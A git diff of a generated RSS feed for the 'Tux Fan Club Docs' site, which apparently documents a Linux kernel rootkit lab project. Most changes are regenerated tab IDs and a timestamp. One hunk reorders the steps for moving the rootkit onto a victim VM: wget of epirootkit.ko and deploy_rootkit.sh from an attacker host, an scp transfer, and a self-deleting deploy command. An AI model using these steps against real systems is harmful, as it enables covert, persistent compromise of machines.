@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 15 Jun 2025 17:27:07 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 15 Jun 2025 17:37:58 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -25,14 +25,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="fdbaecTab" data-bs-toggle="tab" data-bs-target="#fdbaec"
-		 type="button" role="tab" aria-controls="fdbaec" aria-selected="true">Automated (Recommended)&lt;/a>
+		 id="cadebfTab" data-bs-toggle="tab" data-bs-target="#cadebf"
+		 type="button" role="tab" aria-controls="cadebf" aria-selected="true">Automated (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cbfeadTab" data-bs-toggle="tab" data-bs-target="#cbfead"
-		 type="button" role="tab" aria-controls="cbfead" aria-selected="true">Manual Step-by-Step&lt;/a>
+		 id="badcefTab" data-bs-toggle="tab" data-bs-target="#badcef"
+		 type="button" role="tab" aria-controls="badcef" aria-selected="true">Manual Step-by-Step&lt;/a>
 
 		
 
@@ -49,7 +49,7 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="fdbaec" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="cadebf" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="one-command-installation">One-Command Installation &lt;a href="#one-command-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -87,7 +87,7 @@
 
 
 
-&lt;div class="tab-pane fade" id="cbfead" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade" id="badcef" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="install-dependencies">Install Dependencies &lt;a href="#install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -214,14 +214,14 @@ ls -la /dev/kvm # Should be accessible&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="bcfeadTab" data-bs-toggle="tab" data-bs-target="#bcfead"
-		 type="button" role="tab" aria-controls="bcfead" aria-selected="true">Pre-built (Recommended)&lt;/a>
+		 id="ceabfdTab" data-bs-toggle="tab" data-bs-target="#ceabfd"
+		 type="button" role="tab" aria-controls="ceabfd" aria-selected="true">Pre-built (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="bcfeadTab" data-bs-toggle="tab" data-bs-target="#bcfead"
-		 type="button" role="tab" aria-controls="bcfead" aria-selected="true">Fresh VM Setup&lt;/a>
+		 id="fdcebaTab" data-bs-toggle="tab" data-bs-target="#fdceba"
+		 type="button" role="tab" aria-controls="fdceba" aria-selected="true">Fresh VM Setup&lt;/a>
 
 		
 
@@ -238,7 +238,7 @@ ls -la /dev/kvm # Should be accessible&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="bcfead" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="ceabfd" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Everything is pre-configured. Build and run immediately:&lt;/p>
 
@@ -293,14 +293,14 @@ cd .. &amp;amp;&amp;amp; ./deploy_c2.sh
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="074c16a" class="language-bash ">
- &lt;code># Option A: HTTP download
-wget http://192.168.200.11:8080/epirootkit.ko
-wget http://192.168.200.11:8080/deploy_rootkit.sh
-
-# Option B: SCP transfer (from attacker VM)
+ &lt;pre id="a7a6f76" class="language-bash ">
+ &lt;code># Option A: SCP transfer (from attacker VM)
 # First: sudo apt install -y openssh-server (inside victim VM)
 scp epirootkit.ko deploy_rootkit.sh victim@192.168.200.10:~/
+
+# Option B: HTTP download
+wget http://192.168.200.11:8080/epirootkit.ko
+wget http://192.168.200.11:8080/deploy_rootkit.sh
 
 # Option C: Web UI upload (In development)
 # Use attacker&amp;#39;s web interface file transfer &lt;/code>
@@ -344,26 +344,26 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="bdcfeaTab" data-bs-toggle="tab" data-bs-target="#bdcfea"
-		 type="button" role="tab" aria-controls="bdcfea" aria-selected="true">Automated (Recommended)&lt;/a>
+		 id="ebfdacTab" data-bs-toggle="tab" data-bs-target="#ebfdac"
+		 type="button" role="tab" aria-controls="ebfdac" aria-selected="true">Automated (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="dbacfeTab" data-bs-toggle="tab" data-bs-target="#dbacfe"
-		 type="button" role="tab" aria-controls="dbacfe" aria-selected="true">SSH/SCP&lt;/a>
+		 id="edfcbaTab" data-bs-toggle="tab" data-bs-target="#edfcba"
+		 type="button" role="tab" aria-controls="edfcba" aria-selected="true">SSH/SCP&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cfbdeaTab" data-bs-toggle="tab" data-bs-target="#cfbdea"
-		 type="button" role="tab" aria-controls="cfbdea" aria-selected="true">HTTP Server&lt;/a>
+		 id="edacbfTab" data-bs-toggle="tab" data-bs-target="#edacbf"
+		 type="button" role="tab" aria-controls="edacbf" aria-selected="true">HTTP Server&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="dbaecfTab" data-bs-toggle="tab" data-bs-target="#dbaecf"
-		 type="button" role="tab" aria-controls="dbaecf" aria-selected="true">Shared Folders&lt;/a>
+		 id="fbecadTab" data-bs-toggle="tab" data-bs-target="#fbecad"
+		 type="button" role="tab" aria-controls="fbecad" aria-selected="true">Shared Folders&lt;/a>
 
 		
 
@@ -380,7 +380,7 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="bdcfea" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="ebfdac" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="one-command-transfer">One-Command Transfer &lt;a href="#one-command-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>For attacker VM setup:&lt;/p>
 
